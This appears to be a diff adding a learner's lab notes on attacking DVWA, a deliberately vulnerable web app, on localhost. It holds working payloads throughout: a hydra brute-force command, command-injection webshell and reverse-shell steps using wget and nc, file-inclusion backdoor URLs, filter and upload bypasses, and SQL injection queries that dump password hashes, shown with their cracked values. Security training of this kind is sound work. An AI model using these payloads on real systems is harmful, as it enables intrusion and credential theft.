@@ -1,0 +1,131 @@
+#bruteforce
+##low
+trying bruteforce with hydra (stuck. try again later):
+	hydra -L /usr/share/wordlists/jeanphorn-wordlist/usernames.txt -P /usr/share/wordlists/rockyou.txt -o hydra_output.txt -s 80 -f -v localhost http-form-post "/DVWA-master/vulnerabilities/brute/:username=^USER^:password=^PASS^:Login=Login"
+
+#command injection
+##low
+put ; and run commands.
+to upload webshell:
+	0; echo "<?php system(\$_REQUEST['cmd']))>" > command_injection_webshell.php
+to upload reverse shell:
+	in the reverse shell php file: 
+		$ip = '127.0.0.1';  // CHANGE THIS
+		$port = 2212;       // CHANGE THIS
+	run "python2 -m SimpleHTTPServer 5990" in the reverse php shell file folder
+	0; wget 127.0.0.1:5990/php-reverse-shell.php
+	nc -l -p 2212
+	surf to http://127.0.0.1/DVWA-master/vulnerabilities/exec/php-reverse-shell.php
+
+##medium
+	* <0; ls> didnt work
+	* <0 & ls> work!
+	* to upload backdoor: <0 & wget 127.0.0.1:2212/command_injection_medium_backdoor.php>
+	* to upload reverse shell: <0 & wget 127.0.0.1:2212/command_injection_medium_rev.php>
+
+
+#File Inclusion
+##low
+	* can include files with the variable "?page"
+	* include file4.php with "127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file4.php"
+	* include /hackable/fi.php with "http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=../../hackable/flags/fi.php" 
+	  still cant see quote number 3 tho.... lets try to get shell on the machine.
+	* include remote file:
+			** open SimpleHTTPServer on port 2212
+			** in the browser, surf to "http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=http://localhost:2212/hello.php"
+	* include backdoor:
+		** open SimpleHTTPServer on port 2212
+		** in the browser, surf to "http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=http://localhost:2212/simple-backdoor.php&cmd=whoami"
+	* include remote shell:
+		** open SimpleHTTPServer on port 2212
+		** run "nc -l -p 3339"
+		** in the browser, surf to "http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=http://localhost:2212/php-reverse-shell.php"
+		** now you have shell on the nc terminal.
+##medium
+	* the code removes tha patern <../> , so use <.../...//> instead.
+	* <.../...//.../...//hackable/flags/fi.php> works!
+
+#File Upload
+##low
+	* easy. just upload a shell. it prints the location of the uploaded file and everything.
+
+##medium
+	* seems like it only accepts only JPEG and PNG files
+	* changing the file extention (like "shell.png" insted of "shell.php") doesnt work
+	* seems like when im trying to upload a php file there is a header like this:
+		<Content-Type: application/x-php>
+	  and when uploading an image it says:
+	  	<Content-Type: image/png>
+	* uploading a php file and changing the header in burp from <Content-Type: application/x-php> to <Content-Type: image/png> works!
+
+#SQLi
+##low
+	* <bla' or '1'='1> works
+	* <' order by 3#> shows there are only 2 columns in the current query (probably First name, Surname)
+		* <bla' UNION SELECT 1,1#> shows the same thing.
+	* <' UNION SELECT table_name,table_name from information_schema.tables#> shows all tables (located in file information_schema.tables.txt)
+	* <' UNION SELECT table_name,columns_name from information_schema.columns#> shows all tables (located in file information_schema.columns.txt).
+	  looks like there is a password column in the 'users' table!
+	*<' union select user, password from users#> gets what seems to be md5 hash of the passwords. 
+	* cracking them online:
+		user: admin
+		password: 5f4dcc3b5aa765d61d8327deb882cf99
+		cracked_password: password
+
+		user: gordonb
+		password: e99a18c428cb38d5f260853678922e03
+		cracked_password: abc123
+
+		user: 1337
+		password: 8d3533d75ae2c3966d7e0d4fcc69216b
+		cracked_password: charley
+
+		user: pablo
+		password: 0d107d09f5bbe40cade3de5c71e9e9b7
+		cracked_password: letmein
+
+		user: smithy
+		password: 5f4dcc3b5aa765d61d8327deb882cf99
+		cracked_password: password
+	* tried to write file to get shell shell with input <' into outfile 'bla.php'#> but got the error 'Access denied for user 'dvwa'@'localhost' (using password: YES)'. guess the mysql user can't write to files :(
+
+##medium
+	* can put only numbers. send it to burp to put real data in the ID parameter in the request
+	* the code puts a backslash <\> before my <'>
+	* <id=1 UNION SELECT table_name,table_name FROM information_schema.tables> works
+	* <id=1 UNION SELECT user, password FROM users> works
+
+#SQLi Blind
+##low
+	* blaa' or '1'='1 works. 
+	* 1' or sleep(5)# works as well
+	* <bla' union select @@VERSION AS 'version1', @@VERSION AS 'version2'#> works
+	* <bla' union select @@version, table_name from information_schema.tables where @@version like '%1%'#> works!
+	* <bla' union select @@version, table_name from information_schema.tables where @@version like '%MariaDB%'#> works
+	* <bla' union select @@version, table_name from information_schema.tables where @@version like '%3-MariaDB%'#> works
+	* <bla' union select @@version, table_name from information_schema.tables where @@version = '10.3.23-MariaDB-1'#> works
+
+##medium
+	* like the regulat SQL medium level, can put only numbers. send it to burp to put real data in the ID parameter in the request
+	* the code does not exept <'> <id=1 or '1'='1'> failed.
+	* <id=8 UNION SELECT @@version, @@version FROM users> works
+	* in order to use the LIKE operator, we will use the CHAR operator to convert ASCII code to string.
+	* <id=8 UNION SELECT @@version, @@version FROM users WHERE @@version LIKE CHAR(37,49,48,46,51,46,50,51,37)> WORKS!
+	  meaning that the version is 10.3.23!
+
+
+#Weak Session IDs
+##low
+	* the cookie "dvwaSession" is always incremented by 1.
+##medium
+	* the cookie is an increasing date in ctime form.
+
+
+
+
+
+
+
+
+
+
